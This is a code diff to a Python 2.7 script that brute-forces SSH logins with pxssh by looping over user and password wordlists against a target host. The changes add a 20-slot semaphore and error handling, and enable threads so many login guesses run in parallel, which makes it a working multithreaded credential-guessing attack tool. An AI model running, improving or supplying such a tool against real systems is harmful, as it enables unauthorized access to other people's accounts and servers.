@@ -1,3 +1,4 @@
+#!/usr/bin/python2.7
 #-*— coding: utf-8 -*-
 from pexpect import pxssh
 import optparse
@@ -5,12 +6,20 @@ import re
 import time
 from threading import *
 
+connectLock = BoundedSemaphore(20)
+
 
 def connect(host, user, password, release):
-    s = pxssh.pxssh()
-    #  Try login with user/password
-    s.login(host, user, password)
-    print '[+] Password Found: ' + user + " of password is " + password
+    try:
+
+        s = pxssh.pxssh()
+        #  Try login with user/password
+        s.login(host, user, password)
+        print '[+] ' + host +' Password Found: ' + user + " of password is " + password
+    except Exception, e:
+        print 'Error: ', e
+    finally:
+        connectLock.release()
 
 
 def regularMatch(host):
@@ -83,9 +92,10 @@ def violentAttack(host, users, passwords):
         fpasswords.seek(0)
         for password in fpasswords:
             password = password.strip('\r\n')
+            connectLock.acquire()
             print "[-] Testing: " + host + ' '+ str(user) + ' of password is '+ str(password)
-            # t = Thread(target = connect, args = (host, user, password, True))
-            # t.start()
+            t = Thread(target = connect, args = (host, user, password, True))
+            t.start()
     return
 
 
